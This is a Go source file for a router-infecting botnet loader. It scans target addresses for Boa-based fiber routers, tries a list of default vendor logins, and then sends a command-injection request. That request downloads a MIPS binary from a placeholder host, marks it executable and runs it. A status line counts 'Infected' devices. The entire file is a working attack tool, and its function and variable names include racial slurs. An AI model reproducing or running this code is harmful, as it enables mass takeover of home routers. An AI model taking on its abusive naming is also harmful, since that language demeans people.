package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var syncWait sync.WaitGroup
var statusInfected int64
var statusAttempted int64
var statusFound int64
var loginsString = []string{
	"admin:admin",
	"admin:123456",
	"admin:password",
	"adminisp:adminisp",
	"administrator:administrator",
	"user:user",
	"admin:1234",
	"guest:guest",
	"default:default",
	"admin:user",
	"support:support",
	"vodafone:vodafone",
	"telecom:telecom",
	"admin:password123",
	"huawei:huawei",
	"fiberhome:fiberhome",
	"ztehome:ztehome",
	"zte:zte",
	"admin:GPON",
	"admin:gpon",
	"calix:calix",
	"admin:vodafone",
	"admin:jvbzd",
	"admin:ont",
}

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func sendExploit(target string) int {
	conn, err := net.DialTimeout("tcp", target, 60*time.Second)
	if err != nil {
		return -1
	}

	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

	httpRequest := "POST /boaform/admin/formTracert HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n" +
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
		"Accept-Language: en-GB,en;q=0.5\r\n" +
		"Accept-Encoding: gzip, deflate\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 201\r\n" +
		"Origin: http://" + target + "\r\n" +
		"Connection: close\r\n" +
		"Referer: http://" + target + "/diag_tracert_admin_en.asp\r\n" +
		"Upgrade-Insecure-Requests: 1\r\n\r\n" +
		"target_addr=%3Brm%20-rf%20/var/tmp/wlancont%3Bwget%20http://URIP/mips%20-O%20->/var/tmp/wlancont%3Bchmod%20777%20/var/tmp/wlancont%3B/var/tmp/wlancont%20router&waninf=1_INTERNET_R_VID_\r\n\r\n"

	conn.Write([]byte(httpRequest))
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return -1
	}

	return -1
}

func sendNigga(target string) int {
	var isstatusnigger int = 0
	var cntLen int

	for x := 0; x < len(loginsString); x++ {
		loginSplit := strings.Split(loginsString[x], ":")

		conn, err := net.DialTimeout("tcp", target, 60*time.Second)
		if err != nil {
			return -1
		}

		cntLen = 14
		cntLen += len(loginSplit[0])
		cntLen += len(loginSplit[1])

		conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

		httpRequest := "POST /boaform/admin/formLogin HTTP/1.1\r\n" +
			"Host: " + target + "\r\n" +
			"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n" +
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
			"Accept-Language: en-GB,en;q=0.5\r\n" +
			"Accept-Encoding: gzip, deflate\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: " + strconv.Itoa(cntLen) + "\r\n" +
			"Origin: http://" + target + "\r\n" +
			"Connection: keep-alive\r\n" +
			"Referer: http://" + target + "/admin/login.asp\r\n" +
			"Upgrade-Insecure-Requests: 1\r\n\r\n" +
			"username=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"

		conn.Write([]byte(httpRequest))
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
			return -1
		}

		if strings.Contains(string(bytebuf), "HTTP/1.0 302 Moved Temporarily") {
			isstatusnigger = 1 // sorry thats racist, he added it sir
		}

		zeroByte(bytebuf)

		if isstatusnigger == 0 {
			conn.Close()
			continue
		}

		atomic.AddInt64(&statusInfected, 1)
		conn.Close()
		break
	}

	if isstatusnigger == 1 {
		return 1
	} else {
		return -1
	}
}

func checkDevice(target string, timeout time.Duration) int {
	var isxliquidesugardaddy int = 0

	conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
	if err != nil {
		return -1
	}

	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))

	httpRequest := "POST /boaform/admin/formLogin HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n" +
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
		"Accept-Language: en-GB,en;q=0.5\r\n" +
		"Accept-Encoding: gzip, deflate\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 29\r\n" +
		"Origin: http://" + target + "\r\n" +
		"Connection: keep-alive\r\n" +
		"Referer: http://" + target + "/admin/login.asp\r\n" +
		"Upgrade-Insecure-Requests: 1\r\n\r\n" +
		"username=admin&psd=Feefifofum\r\n\r\n"

	conn.Write([]byte(httpRequest))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return -1
	}

	if strings.Contains(string(bytebuf), "Server: Boa/0.93.15") {
		atomic.AddInt64(&statusFound, 1)
		isxliquidesugardaddy = 1
	}
	zeroByte(bytebuf)

	if isxliquidesugardaddy == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {
	defer syncWait.Done()

	if checkDevice(target, 10) == 1 {
		sendNigga(target)
		sendExploit(target)
		return
	} else {
		return
	}
}

func main() {
	rand.Seed(time.Now().UTC().UnixNano())
	go func() {
		for {
			fmt.Printf("\033[33mFound: %d\033[0m \033[91mInfected: %d\033[0m\r\n",
				atomic.LoadInt64(&statusFound),
				atomic.LoadInt64(&statusInfected))
			time.Sleep(1 * time.Second)
		}
	}()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			go processTarget(scan.Text()+":"+os.Args[1], scan.Text())
			atomic.AddInt64(&statusAttempted, 1)
			syncWait.Add(1)
		}
	}
}
